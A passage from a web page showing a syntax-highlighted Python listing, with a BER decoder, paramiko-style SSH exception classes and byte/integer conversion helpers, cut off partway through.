class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> md5 <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"></span><br><span class="line">limited = <span class="literal">True</span>  <span class="comment"># set to False for &quot;development&quot; mode!</span></span><br><span class="line"></span><br><span class="line">PY3 = sys.version_info[<span class="number">0</span>] == <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> PY3:</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3, AES</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    AES = Object()</span><br><span class="line">    AES.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    DES3 = Object()</span><br><span class="line">    DES3.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    limited = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BERException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BER</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Robey&#x27;s tiny little attempt at a BER decoder.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, content=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.content = content</span><br><span class="line">        self.idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;BER(\&#x27;&#x27;</span> + repr(self.content) + <span class="string">&#x27;\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.decode_next()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ident = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (ident &amp; <span class="number">31</span>) == <span class="number">31</span>:</span><br><span class="line">            <span class="comment"># identifier &gt; 30</span></span><br><span class="line">            ident = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> self.idx &lt; len(self.content):</span><br><span class="line">                t = ord(self.content[self.idx])</span><br><span class="line">                self.idx += <span class="number">1</span></span><br><span class="line">                ident = (ident &lt;&lt; <span class="number">7</span>) | (t &amp; <span class="number">0x7f</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (t &amp; <span class="number">0x80</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># now fetch length</span></span><br><span class="line">        size = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> size &amp; <span class="number">0x80</span>:</span><br><span class="line">            <span class="comment"># more complimicated...</span></span><br><span class="line">            <span class="comment"># <span class="doctag">FIXME:</span> theoretically should handle indefinite-length (0x80)</span></span><br><span class="line">            t = size &amp; <span class="number">0x7f</span></span><br><span class="line">            <span class="keyword">if</span> self.idx + t &gt; len(self.content):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            size = inflate_long(self.content[self.idx: self.idx + t], <span class="literal">True</span>)</span><br><span class="line">            self.idx += t</span><br><span class="line">        <span class="keyword">if</span> self.idx + size &gt; len(self.content):</span><br><span class="line">            <span class="comment"># can&#x27;t fit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        data = self.content[self.idx: self.idx + size]</span><br><span class="line">        self.idx += size</span><br><span class="line">        <span class="comment"># now switch on id</span></span><br><span class="line">        <span class="keyword">if</span> ident == <span class="number">0x30</span>:</span><br><span class="line">            <span class="comment"># sequence</span></span><br><span class="line">            <span class="keyword">return</span> self.decode_sequence(data)</span><br><span class="line">        <span class="keyword">elif</span> ident == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># int</span></span><br><span class="line">            <span class="keyword">return</span> inflate_long(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 1: boolean (00 false, otherwise true)</span></span><br><span class="line">            <span class="keyword">raise</span> BERException(<span class="string">&#x27;Unknown ber encoding type %d (robey is lazy)&#x27;</span> % ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_sequence</span>(<span class="params">data</span>):</span></span><br><span class="line">        out = []</span><br><span class="line">        b = BER(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            x = b.decode_next()</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out.append(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    decode_sequence = staticmethod(decode_sequence)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSHException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised by failures in SSH2 protocol negotiation or logic errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when authentication failed for some reason.  It may be</span></span><br><span class="line"><span class="string">    possible to retry with different credentials.  (Other classes specify more</span></span><br><span class="line"><span class="string">    specific reasons.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordRequiredException</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when a password is needed to unlock a private key file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadAuthenticationType</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an authentication type (like password) is used, but</span></span><br><span class="line"><span class="string">    the server isn&#x27;t allowing that type.  (It may only allow public-key, for</span></span><br><span class="line"><span class="string">    example.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar allowed_types: list of allowed authentication types provided by the</span></span><br><span class="line"><span class="string">        server (possible values are: C&#123;&quot;none&quot;&#125;, C&#123;&quot;password&quot;&#125;, and</span></span><br><span class="line"><span class="string">        C&#123;&quot;publickey&quot;&#125;).</span></span><br><span class="line"><span class="string">    @type allowed_types: list</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, explanation, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, explanation)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> SSHException.__str__(self) + <span class="string">&#x27; (allowed_types=%r)&#x27;</span> % self.allowed_types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PartialAuthentication</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    An internal exception thrown in the case of partial authentication.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, <span class="string">&#x27;partial authentication&#x27;</span>)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChannelException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an attempt to open a new L&#123;Channel&#125; fails.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar code: the error code returned by the server</span></span><br><span class="line"><span class="string">    @type code: int</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, code, text</span>):</span></span><br><span class="line">        SSHException.__init__(self, text)</span><br><span class="line">        self.code = code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadHostKeyException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    The host key given by the SSH server did not match what we were expecting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar hostname: the hostname of the SSH server</span></span><br><span class="line"><span class="string">    @type hostname: str</span></span><br><span class="line"><span class="string">    @ivar key: the host key presented by the server</span></span><br><span class="line"><span class="string">    @type key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">    @ivar expected_key: the host key expected</span></span><br><span class="line"><span class="string">    @type expected_key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hostname, got_key, expected_key</span>):</span></span><br><span class="line">        SSHException.__init__(self, <span class="string">&#x27;Host key for server %s does not match!&#x27;</span> % hostname)</span><br><span class="line">        self.hostname = hostname</span><br><span class="line">        self.key = got_key</span><br><span class="line">        self.expected_key = expected_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inflate_long</span>(<span class="params">s, always_positive=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;turns a normalized byte string into a long-int</span></span><br><span class="line"><span class="string">    (adapted from Crypto.Util.number)&quot;&quot;&quot;</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> always_positive <span class="keyword">and</span> (len(s) &gt; <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">        negative = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">4</span>:</span><br><span class="line">        filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> negative:</span><br><span class="line">            filler = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">        s = filler * (<span class="number">4</span> - len(s) % <span class="number">4</span>) + s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        out = (out &lt;&lt; <span class="number">32</span>) + struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, s[i:i + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> negative:</span><br><span class="line">        out -= (<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * len(s)))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflate_long</span>(<span class="params">n, add_sign_padding=True</span>):</span></span><br><span class="line">    <span class="string">&quot;turns a long-int into a normalized byte string (adapted from Crypto.Util.number)&quot;</span></span><br><span class="line">    <span class="comment"># after much testing, this algorithm was deemed to be the fastest</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    n = long(n)</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) <span class="keyword">and</span> (n != <span class="number">-1</span>):</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="comment"># strip off leading zeros, FFs</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(s):</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\000&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\xff&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># degenerate case, n was either 0 or -1</span></span><br><span class="line">        i = (<span class="number">0</span>,)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            s = <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">    s = s[i[<span class="number">0</span>]:]</span><br><span class="line">    <span class="keyword">if</span> add_sign_padding:</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\x00&#x27;</span> + s</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &lt; <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span> + s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_weird</span>(<span class="params">data</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        out += <span class="string">&#x27;%02X&#x27;</span> % ord(i[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">2</span>:</span><br><span class="line">            out += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">16</span> == <span class="number">15</span>:</span><br><span class="line">            out += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary</span>(<span class="params">data, prefix=<span 